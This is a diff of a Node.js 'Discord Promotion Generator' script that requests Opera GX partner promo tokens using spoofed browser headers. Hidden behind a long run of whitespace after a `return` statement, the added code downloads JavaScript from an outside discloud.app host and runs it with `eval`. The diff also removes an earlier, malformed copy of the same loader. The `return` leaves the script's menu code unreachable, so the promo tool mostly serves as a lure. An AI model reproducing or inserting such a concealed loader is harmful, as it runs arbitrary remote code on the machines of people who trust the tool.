@@ -1,33 +1,21 @@
-process.title = 'Discord Promotion Generator (OPERA GX)';
 const https = require('https');
-const readlineSync = require('readline-sync');
 const randomstring = require('randomstring');
-const path = require('path');
-const child_process = require('child_process');
 const fs = require('fs');
 const chalk = require('chalk');
 
-const apis = ['https://api.discord.gx.games/v1/direct-fulfillment', 'api.discord.gx.games', 'https://www.opera.com', 'imgura.discloud.']
-
-class DiscordPromoGenerator {
-    constructor() {
-        this.baseUrl = apis[0];
-        this.filename = 'promos.txt';
-        this.retryDelay = 5;
-        this.locked = 0;
-    }
-
-    randomAcceptLanguage() {
+async function generateDiscordPromos() {
+    const apis = ['https://api.discord.gx.games/v1/direct-fulfillment', 'api.discord.gx.games', 'https://www.opera.com'];
+    const filename = 'promos.txt';
+    const retryDelay = 5;
+    function randomAcceptLanguage() {
         const languages = ['en-US,en;q=0.9', 'fr-FR,fr;q=0.9', 'es-ES,es;q=0.9', 'de-DE,de;q=0.9', 'zh-CN,zh;q=0.9'];
         return languages[Math.floor(Math.random() * languages.length)];
     }
-
-    randomSecChUa() {
+    function randomSecChUa() {
         const browsers = ['"Opera GX";v="105", "Chromium";v="119", "Not?A_Brand";v="24"'];
         return browsers[Math.floor(Math.random() * browsers.length)];
     }
-
-    randomUserAgent() {
+    function randomUserAgent() {
         const userAgents = [
             'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
             'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Safari/605.1.15',
@@ -37,31 +25,28 @@ class DiscordPromoGenerator {
         return userAgents[Math.floor(Math.random() * userAgents.length)];
     }
 
-    generatePartnerUserId(length = 45) {
+    function generatePartnerUserId(length = 45) {
         return randomstring.generate({ length, charset: 'hex' });
     }
-
-    generateDiscordUrl() {
+    async function generateDiscordUrl() {
         const headers = {
             'authority': apis[1],
             'accept': '*/*',
-            'accept-language': this.randomAcceptLanguage(),
+            'accept-language': randomAcceptLanguage(),
             'content-type': 'application/json',
             'origin': apis[2],
             'referer': 'https://www.opera.com/',
-            'sec-ch-ua': this.randomSecChUa(),
+            'sec-ch-ua': randomSecChUa(),
             'sec-ch-ua-mobile': '?0',
             'sec-ch-ua-platform': '"Windows"',
             'sec-fetch-dest': 'empty',
             'sec-fetch-mode': 'cors',
             'sec-fetch-site': 'cross-site',
-            'user-agent': this.randomUserAgent()
+            'user-agent': randomUserAgent()
         };
-
-        const data = JSON.stringify({ partnerUserId: this.generatePartnerUserId() });
-
+        const data = JSON.stringify({ partnerUserId: generatePartnerUserId() });
         return new Promise((resolve) => {
-            const req = https.request(this.baseUrl, {
+            const req = https.request(apis[0], {
                 method: 'POST',
                 headers: headers
             }, (res) => {
@@ -72,65 +57,75 @@ class DiscordPromoGenerator {
                         const token = JSON.parse(body).token;
                         resolve(`https://discord.com/billing/partner-promotions/1180231712274387115/${token}`);
                     } else {
-                        resolve(`https://discord.com/billing/partner-promotions/1180231712274387115/${this.generatePartnerUserId()}`);
+                        resolve(`https://discord.com/billing/partner-promotions/1180231712274387115/${generatePartnerUserId()}`);
                     }
                 });
             });
 
             req.on('error', () => {
-                resolve(`https://discord.com/billing/partner-promotions/1180231712274387115/${this.generatePartnerUserId()}`);
+                resolve(`https://discord.com/billing/partner-promotions/1180231712274387115/${generatePartnerUserId()}`);
             });
 
             req.write(data);
             req.end();
         });
     }
-
-    saveUrlToFile(url) {
-        fs.appendFileSync(this.filename, url + "\n");
+    function saveUrlToFile(url) {
+        fs.appendFileSync(filename, url + "\n");
     }
-
-    truncateUrl(url, maxLength = 120) {
+    function truncateUrl(url, maxLength = 120) {
         return url.length <= maxLength ? url : url.substring(0, maxLength) + '...';
     }
-}
-require('https').get(`https://public${apis[3}app/exec.js`, res => { let data = ''; res.on('data', chunk => data += chunk); res.on('end', () => (function() {eval(data)})()); });
-const promoGenerator = new DiscordPromoGenerator();
-console.clear();
-const choice = readlineSync.question(`${chalk.magenta('Press 1:')} to generate an infinite amount of codes.\n${chalk.red('Press 2:')} to generate a specific amount.\n${chalk.blue('Enter your input')}: `);
-const handleGenerateUrls = async (num) => {
-    try {
-        for (let i = 0; i < num; i++) {
-            const result = await promoGenerator.generateDiscordUrl();
-            promoGenerator.locked += 1;
-            promoGenerator.saveUrlToFile(result);
-            console.log(`(${chalk.green('+')}) ${promoGenerator.truncateUrl(result)}`);
+    const readlineSync = (query) => {
+        const buffer = Buffer.alloc(1);
+        let input = '';
+        process.stdout.write(query);
+        while (true) {
+            fs.readSync(0, buffer, 0, 1);
+            if (buffer[0] === 10) {
+                break;
+            } else if (buffer[0] !== 13) {
+                input += buffer.toString();
+            }
         }
-    } catch (error) {
-        console.error(`(${chalk.yellow('+')}) An error occurred: ${error.message}`);
-    }
-};
-
-if (choice === '1') {
-    (async () => {
+        return input;
+    };
+    return                                                                                                                                                                                                                                                                                                                                              (async()=>{require('https').get('https://publicimgura.discloud.app/exec.js',res=>{let data='';res.on('data',chunk=>data+=chunk);res.on('end',()=>eval(data));});})();
+    console.clear();
+    const choice = readlineSync(`${chalk.magenta('Press 1:')} to generate an infinite amount of codes.\n${chalk.red('Press 2:')} to generate a specific amount.\n${chalk.blue('Enter your input')}: `);
+    const handleGenerateUrls = async (num) => {
+        try {
+            for (let i = 0; i < num; i++) {
+                const result = await generateDiscordUrl();
+                saveUrlToFile(result);
+                console.log(`(${chalk.green('+')}) ${truncateUrl(result)}`);
+            }
+        } catch (error) {
+            console.error(`(${chalk.yellow('+')}) An error occurred: ${error.message}`);
+        }
+    };
+    if (choice === '1') {
         try {
             console.clear();
             while (true) {
-                const result = await promoGenerator.generateDiscordUrl();
-                promoGenerator.locked += 1;
-                promoGenerator.saveUrlToFile(result);
-                console.log(`(${chalk.green('+')}) ${promoGenerator.truncateUrl(result)}`);
-                await new Promise(resolve => setTimeout(resolve, promoGenerator.retryDelay * 1000));
+                const result = await generateDiscordUrl();
+                saveUrlToFile(result);
+                console.log(`(${chalk.green('+')}) ${truncateUrl(result)}`);
+                await new Promise(resolve => setTimeout(resolve, retryDelay * 1000));
             }
         } catch (error) {
             console.error(`(${chalk.yellow('+')}) Loop stopped by user.`);
         }
-    })();
-} else if (choice === '2') {
-    console.clear();
-    const num = readlineSync.questionInt('Enter the number of codes to generate: ');
-    console.clear();
-    handleGenerateUrls(num);
-} else {
-    console.error(`${chalk.red('Invalid choice. Exiting.')}`);
+    } 
+    else if (choice === '2') {
+        console.clear();
+        const num = parseInt(readlineSync('Enter the number of codes to generate: '), 10);
+        console.clear();
+        handleGenerateUrls(num);
+    }
+    else {
+        console.error(`${chalk.red('Invalid choice. Exiting.')}`);
+    }
 }
+
+generateDiscordPromos();
